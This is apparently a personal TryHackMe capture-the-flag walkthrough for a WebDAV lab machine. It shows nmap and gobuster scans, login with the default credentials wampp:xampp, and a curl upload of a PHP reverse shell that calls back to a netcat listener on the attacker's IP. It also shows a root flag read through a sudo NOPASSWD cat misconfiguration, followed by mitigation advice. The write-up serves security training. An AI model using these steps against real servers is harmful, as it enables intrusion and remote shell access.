# 🟩DAV – Try Hack Me (THM) Walkthrough Report 

**Prepared by:** Nishanth Antony  
**Date:** October 25, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation & Privilege Escalation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open services, web directories, and potential vulnerabilities on the target machine.
- **Commands Used and Outputs:**  
  - Full port scan with service version detection:  
    ```
    ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~]
    └─$ nmap -p- -sV --min-rate=1000 10.201.52.93 -T4 -v
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 20:56 IST
    NSE: Loaded 47 scripts for scanning.
    Initiating Ping Scan at 20:56
    Scanning 10.201.52.93 [4 ports]
    Completed Ping Scan at 20:56, 0.50s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 20:56
    Completed Parallel DNS resolution of 1 host. at 20:56, 0.04s elapsed
    Initiating SYN Stealth Scan at 20:56
    Scanning 10.201.52.93 [65535 ports]
    Discovered open port 80/tcp on 10.201.52.93
    SYN Stealth Scan Timing: About 43.18% done; ETC: 20:57 (0:00:41 remaining)
    Completed SYN Stealth Scan at 20:57, 70.25s elapsed (65535 total ports)
    Initiating Service scan at 20:57
    Scanning 1 service on 10.201.52.93
    Completed Service scan at 20:57, 6.84s elapsed (1 service on 1 host)
    NSE: Script scanning 10.201.52.93.
    Initiating NSE at 20:57
    Completed NSE at 20:57, 1.87s elapsed
    Initiating NSE at 20:57
    Completed NSE at 20:57, 1.78s elapsed
    Nmap scan report for 10.201.52.93
    Host is up (0.38s latency).
    Not shown: 65534 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    
    Read data files from: /usr/share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 81.93 seconds
               Raw packets sent: 69499 (3.058MB) | Rcvd: 70195 (2.961MB)
    ```
    **Output Explanation:**  
    The Nmap command uses `-p-` to scan all 65,535 ports, `-sV` for service versioning, `--min-rate=1000` for speed, and `-T4` for aggressive timing. Only port 80 (HTTP) is open, running Apache 2.4.18 on Ubuntu, indicating a web server as the primary attack surface. The verbose output (`-v`) shows scan progress, and NSE scripts provide additional checks but no critical findings.

  - Directory enumeration with Gobuster:  
    ```
    ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~]
    └─$ gobuster dir -u http://10.201.52.93 -w /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.8
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.201.52.93
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 291]
    /.htpasswd            (Status: 403) [Size: 296]
    /.htaccess            (Status: 403) [Size: 296]
    /index.html           (Status: 200) [Size: 11321]
    /server-status        (Status: 403) [Size: 300]
    /webdav               (Status: 401) [Size: 459]
    Progress: 4614 / 4614 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    ```
    **Output Explanation:**  
    Gobuster scans for directories/files using the common.txt wordlist from dirb. It identifies `/webdav` with a 401 status (unauthorized, requiring authentication), alongside forbidden (403) paths like `.htaccess` and the default `/index.html` (200). The 401 on `/webdav` suggests a protected directory, likely WebDAV-enabled, prompting credential testing.

- **Web Enumeration:**  
  - Accessed `http://10.201.52.93` in a browser, revealing the default Apache page (no actionable content).
  - Researched WebDAV vulnerabilities online, identifying default credentials `wampp:xampp` commonly used in misconfigured WebDAV setups (e.g., XAMPP/WAMP servers).
  - Manually accessed `http://10.201.52.93/webdav` with credentials `wampp:xampp` (via browser or tool like curl/davtest), confirming access to a WebDAV directory containing `passwd.dav` with the same credentials.

- **Findings:**  
  - Only port 80 open, running Apache 2.4.18.
  - WebDAV directory (`/webdav`) requires authentication; default credentials `wampp:xampp` work.
  - WebDAV allows file uploads, and `passwd.dav` exposes the login credentials, indicating poor security.

---

## 2. Exploitation Process

### Step 1 – WebDAV Access
- Used default credentials `wampp:xampp` to access `/webdav`, revealing `passwd.dav` containing the same credentials, confirming weak configuration.
- Researched WebDAV file upload capabilities, identifying it as a vector for deploying a malicious PHP script.

### Step 2 – PHP Reverse Shell Upload
- Created a PHP reverse shell script:  
  ```
  ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~/THM/webdav]
  └─$ nano rev_shell.php
  ```
  **Output Explanation:**  
  No output; nano used to edit `rev_shell.php` (sourced from GitHub, modified with attacker’s IP/port, e.g., `10.23.156.151:6969`).

- Uploaded the shell via curl:  
  ```
  ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~/THM/webdav]
  └─$ curl --user "wampp:xampp" http://10.201.52.93/webdav/ --upload-file rev_shell.php -v
  *   Trying 10.201.52.93:80...
  * Connected to 10.201.52.93 (10.201.52.93) port 80
  * using HTTP/1.x
  * Server auth using Basic with user 'wampp'
  > PUT /webdav/rev_shell.php HTTP/1.1
  > Host: 10.201.52.93
  > Authorization: Basic [REDACTED]
  > User-Agent: curl/8.15.0
  > Accept: */*
  > Content-Length: 5494
  >
  * upload completely sent off: 5494 bytes
  < HTTP/1.1 201 Created
  < Date: Sat, 25 Oct 2025 15:51:57 GMT
  < Server: Apache/2.4.18 (Ubuntu)
  < Location: http://10.201.52.93/webdav/rev_shell.php
  < Content-Length: 273
  < Content-Type: text/html; charset=ISO-8859-1
  <
  <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
  <html><head>
  <title>201 Created</title>
  </head><body>
  <h1>Created</h1>
  <p>Resource /webdav/rev_shell.php has been created.</p>
  <hr />
  <address>Apache/2.4.18 (Ubuntu) Server at 10.201.52.93 Port 80</address>
  </body></html>
  * Connection #0 to host 10.201.52.93 left intact
  ```
  **Output Explanation:**  
  Curl uses HTTP PUT to upload `rev_shell.php` to `/webdav` with Basic Auth (credentials redacted). The 201 Created response confirms successful upload, making the shell accessible at `http://10.201.52.93/webdav/rev_shell.php`.

### Step 3 – Shell Execution and User Access
- Set up a netcat listener:  
  ```
  ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~/THM/webdav]
  └─$ nc -lvnp 6969
  listening on [any] 6969 ...
  connect to [10.23.156.151] from (UNKNOWN) [10.201.52.93] 36770
  Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
   08:52:38 up 28 min,  0 users,  load average: 0.00, 0.00, 0.00
  USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  /bin/sh: 0: can't access tty; job control turned off
  $ ls
  bin
  boot
  dev
  etc
  home
  initrd.img
  initrd.img.old
  lib
  lib64
  lost+found
  media
  mnt
  opt
  proc
  root
  run
  sbin
  srv
  sys
  tmp
  usr
  var
  vmlinuz
  vmlinuz.old
  $ cd home
  $ ls
  merlin
  wampp
  $ cd merlin
  $ ls
  user.txt
  $ cat user.txt
  [REDACTED]
  ```
  **Output Explanation:**  
  Netcat listens on port 6969. Triggering `http://10.201.52.93/webdav/rev_shell.php` (via browser or curl) connects back, providing a shell as `www-data` (Apache user). Navigation reveals users `merlin` and `wampp`; `user.txt` in `/home/merlin` contains the user flag.

### Step 4 – Privilege Escalation
- Enumerate sudo privileges:  
  ```
  $ sudo -l
  Matching Defaults entries for www-data on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on ubuntu:
      (ALL) NOPASSWD: /bin/cat
  ```
  **Output Explanation:**  
  Shows `www-data` can run `/bin/cat` as any user without a password, a significant privilege escalation vector.

- Attempt to read root flag:  
  ```
  $ /bin/cat /root/root.txt
  /bin/cat: /root/root.txt: Permission denied
  ```
  **Output Explanation:**  
  Direct access fails due to permissions.

- Use sudo to read root flag:  
  ```
  $ sudo -u root /bin/cat /root/root.txt
  [REDACTED]
  ```
  **Output Explanation:**  
  Sudo with `-u root` runs `cat` as root, bypassing permissions to read the root flag.

---

## 3. Proof of Concept (PoC)

- **WebDAV Auth PoC:**  
  ```
  ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~/THM/webdav]
  └─$ curl --user "wampp:[REDACTED]" http://10.201.52.93/webdav/passwd.dav
  ```
  Accesses `passwd.dav`, confirming default credentials `wampp:[REDACTED]`.

- **Shell Upload PoC:**  
  ```
  ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~/THM/webdav]
  └─$ nano rev_shell.php
  ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~/THM/webdav]
  └─$ curl --user "wampp:[REDACTED]" http://10.201.52.93/webdav/ --upload-file rev_shell.php -v
  ┌──(Nishanth㉿LAPTOP-4CC2EUBM)-[~/THM/webdav]
  └─$ nc -lvnp 6969
  ```
  Uploads PHP reverse shell and catches it with netcat, gaining `www-data` shell.

- **Sudo Cat Abuse PoC:**  
  ```
  $ sudo -u root /bin/cat /root/root.txt
  ```
  Reads root-protected file as `www-data` via sudo, proving escalation.

---

## 4. Privilege Escalation

- **Technique:** Abuse of `NOPASSWD: /bin/cat` in sudoers, allowing `www-data` to read any file as any user, including root.
- **Details:** The `sudo -u root /bin/cat /root/root.txt` command directly accesses the root flag, bypassing file permissions due to unrestricted sudo privileges.

---

## 5. Mitigation Recommendations

- **WebDAV Security:**  
  - Disable WebDAV if unnecessary or enforce strong, unique credentials (not defaults like `wampp:xampp`).  
  - Restrict file uploads via WebDAV config (e.g., Apache’s `Limit` directive).  
  - Remove sensitive files like `passwd.dav` from accessible directories.  
- **Sudo Hardening:**  
  - Remove `NOPASSWD` entries; require passwords for sensitive commands.  
  - Restrict `/bin/cat` to specific files or remove from sudoers entirely.  
  - Use least privilege—limit `www-data` to minimal access.  
- **Apache Security:**  
  - Update Apache from 2.4.18 (EOL) to latest version to patch known vulnerabilities.  
  - Disable directory indexing and restrict `.ht*` files (already 403).  
  - Use mod_security WAF to filter malicious uploads.  
- **File Permissions:**  
  - Ensure `/root` and sensitive files are not world-readable. Audit with `find / -perm -o+r`.  
- **General Hardening:**  
  - Implement a firewall (e.g., ufw) to limit port 80 exposure.  
  - Monitor file uploads and server logs for anomalies (e.g., using fail2ban or auditd).  
  - Use AppArmor/SELinux to restrict `www-data` actions.

---

## 6. Lessons Learned

- **Default Credentials:** Common WebDAV defaults (e.g., `wampp:xampp`) are easily exploited; always check for them.  
- **WebDAV Uploads:** File upload capabilities in WebDAV can lead to RCE if not restricted.  
- **Sudo Misconfigurations:** Broad sudo permissions (e.g., `cat` as root) enable trivial escalation.  
- **Enumeration Importance:** Directory brute-forcing (Gobuster) and privilege checks (`sudo -l`) uncover critical paths.  
- **Reverse Shells:** PHP shells are effective for gaining initial access on misconfigured web servers.

---

## 7. Skills Practiced

- Network scanning (Nmap with versioning).  
- Directory enumeration (Gobuster).  
- WebDAV exploitation (default creds, file uploads).  
- PHP reverse shell deployment and handling (curl, netcat).  
- Linux privilege escalation via sudo abuse.  
- File system enumeration and flag capture.
